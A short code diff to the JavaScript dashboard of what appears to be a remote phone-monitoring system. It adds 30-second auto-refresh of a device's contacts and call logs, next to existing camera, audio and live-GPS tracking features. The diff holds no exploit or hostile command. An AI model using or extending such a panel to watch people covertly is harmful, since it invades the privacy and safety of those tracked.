@@ -18,6 +18,8 @@ let currentCamObjectUrl = null;
 let sentAudioLog = [];
 let mapFollowMode = true; // Auto-center map on device GPS updates
 let trailRefreshInterval = null;
+let contactsRefreshInterval = null; // Auto-refresh contacts from server DB
+let calllogsRefreshInterval = null; // Auto-refresh call logs from server DB
 
 // Street name history (reverse geocoding)
 let recentStreets = [];       // last 10 unique street names
@@ -1369,6 +1371,16 @@ function selectDevice(deviceId) {
         if (badge) badge.style.display = 'none';
         fetchDeviceHistory(deviceId);
 
+        // Auto-refresh contacts and call logs every 30 s so the panel stays
+        // current without the user having to click Sync manually.
+        if (contactsRefreshInterval) clearInterval(contactsRefreshInterval);
+        if (calllogsRefreshInterval) clearInterval(calllogsRefreshInterval);
+        contactsRefreshInterval = setInterval(() => {
+            if (currentDeviceId) fetchContacts(currentDeviceId);
+        }, 30000);
+        calllogsRefreshInterval = setInterval(() => {
+            if (currentDeviceId) fetchCallLogs(currentDeviceId);
+        }, 30000);
     }
 
     if (window.innerWidth <= 767) closeSidebar();
